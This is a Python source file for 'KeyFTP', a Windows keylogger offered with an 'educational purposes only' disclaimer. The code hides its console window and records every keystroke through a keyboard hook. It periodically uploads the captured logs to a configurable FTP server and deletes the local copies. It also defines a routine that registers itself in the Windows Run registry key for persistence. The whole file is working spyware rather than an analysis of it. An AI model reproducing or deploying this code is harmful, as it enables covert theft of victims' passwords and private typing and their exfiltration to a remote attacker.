'''
KeyFTP - Python FTP Keylogger For Windows

REQUIREMENTS --
-- Python 2.7: http://www.python.org/getit/
-- pyHook Module: http://sourceforge.net/projects/pyhook/
-- pyrhoncom Module: http://sourceforge.net/projects/pywin32/
-- pyHook Module -
-- Unofficial Windows Binaries for Python Extension Packages: http://www.lfd.uci.edu/~gohlke/pythonlibs/
-- DISCLAIMER - FOR EDUCATIONAL PURPOSES ONLY.  
-- I CANNOT BE HELD ACCOUNTABLE FOR YOUR USE OF THIS CODE.
'''
import pythoncom
import pyHook
import os
import sys
import threading
import urllib,urllib2
import ftplib
import datetime,time
import win32event, win32api, winerror
from _winreg import *

x=''
data=''
count=0

#Hide Console
def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

# Add to startup
def addStartup():
    fp=os.path.dirname(os.path.realpath(__file__))
    file_name=sys.argv[0].split("\\")[-1]
    new_file_path=fp+"\\"+file_name
    keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change= OpenKey(HKEY_CURRENT_USER,
    keyVal,0,KEY_ALL_ACCESS)

    SetValueEx(key2change, "KeyFTP",0,REG_SZ, new_file_path)

#Upload logs to FTP account
def ftp():
    global data,count
    if len(data)>10000:
        count+=1
        FILENAME="logs-"+str(count)+".txt"
        fp=open(FILENAME,"a")
        fp.write(data)
        fp.close()
        data=''
        try:
	# Change server below.
            SERVER="FTPSERVER.COM" #Specify your FTP Server address
            USERNAME="USERNAME" #Specify your FTP Username
            PASSWORD="PASSWORD" #Specify your FTP Password
            SSL=0 #Set 1 for SSL and 0 for normal connection
            OUTPUT_DIR="/" #Specify output directory here
            if SSL==0:
                ft=ftplib.FTP(SERVER,USERNAME,PASSWORD)
            elif SSL==1:
                ft=ftplib.FTP_TLS(SERVER,USERNAME,PASSWORD)
            ft.cwd(OUTPUT_DIR)
            fp=open(FILENAME,'rb')
            cmd= 'STOR' +' '+FILENAME
            ft.storbinary(cmd,fp)
            ft.quit()
            fp.close()
            os.remove(FILENAME)
        except Exception as e:
            print e
    return True

def main():
    hide()
    return True

if __name__ == '__main__':
    main()

def keypressed(event):
    global data
    if event.Ascii==13:
        keys='<ENTER>'
    elif event.Ascii==8:
        keys='<BACK SPACE>'
    elif event.Ascii==9:
        keys='<TAB>'
    else:
        keys=chr(event.Ascii)
    data=data+keys
    ftp()

obj = pyHook.HookManager()
obj.KeyDown = keypressed
obj.HookKeyboard()
pythoncom.PumpMessages()
